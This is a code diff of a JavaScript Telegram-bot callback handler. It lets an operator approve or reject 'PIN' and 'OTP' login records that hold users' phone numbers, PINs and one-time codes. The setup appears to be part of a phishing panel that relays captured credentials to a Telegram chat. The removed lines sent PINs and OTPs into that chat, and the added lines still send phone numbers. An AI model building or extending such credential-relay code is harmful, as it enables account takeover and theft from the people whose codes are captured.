@@ -208,36 +208,27 @@ async function handleCallback(cq) {
     const stamp = (action === 'correct' || action === 'otp_approve') ? '✅ Approved' : '❌ Rejected';
     console.log(`[${kind.toLowerCase()} callback] Received: action=${action}, id=${id}`);
     const rec = await store.get(store.NS.LOGIN, id);
-    console.log(`[${kind.toLowerCase()} callback] Record found:`, !!rec, rec?.phone || '(none)');
+    console.log(`[${kind.toLowerCase()} callback] Record found:`, !!rec);
     if (rec) {
       rec.status = decision;
       rec.decided = true;
       await store.set(store.NS.LOGIN, id, rec);
-      // Verify the update
-      const verify = await store.get(store.NS.LOGIN, id);
-      console.log(`[${kind.toLowerCase()} callback] Verified update:`, verify?.decided, verify?.status);
     } else {
-      // Record not found - this can happen on Vercel without KV
-      // Send a notification anyway for debugging
-      console.error(`[${kind.toLowerCase()} decision] ${id} not found in store (shared=${store.shared}, kv=${store.usingKV})`);
-      tgApi('sendMessage', {
-        chat_id: CHAT_ID,
-        text: `⚠️ ${kind} verification callback received but record ${id} not found. Store shared=${store.shared}, KV=${store.usingKV}`
-      });
+      // On Vercel without KV, records can't be shared between requests
+      // Just acknowledge the callback gracefully
+      console.log(`[callback] No record found (expected on Vercel without KV) - id:`, id);
     }
     tgApi('answerCallbackQuery', { callback_query_id: cq.id, text: `${kind} ${decision}` });
-    if (rec && rec.messageId) {
+    if (rec && rec.chatId && rec.messageId) {
       tgApi('editMessageText', {
         chat_id: rec.chatId,
         message_id: rec.messageId,
         parse_mode: 'HTML',
-          text:
-            `<b>🔐 ${kind} Verification</b>\n\n` +
-            `User: ${esc(rec.phone || 'N/A')}\n` +
-            (kind === 'PIN' && rec.pin ? `PIN: ${esc(rec.pin)}\n` : '') +
-            (kind === 'OTP' && rec.otp ? `OTP: ${esc(rec.otp)}\n` : '') +
-            `Time: ${new Date(rec.timestamp).toLocaleString()}\n\n` +
-            `Status: <b>${stamp}</b>`,
+        text:
+          `<b>🔐 ${kind} Verification</b>\n\n` +
+          (rec.phone ? `User: ${esc(rec.phone)}\n` : '') +
+          `Time: ${new Date().toLocaleString()}\n\n` +
+          `Status: <b>${stamp}</b>`,
       });
     }
     console.log(`[${kind.toLowerCase()} decision] ${id} -> ${decision}`);
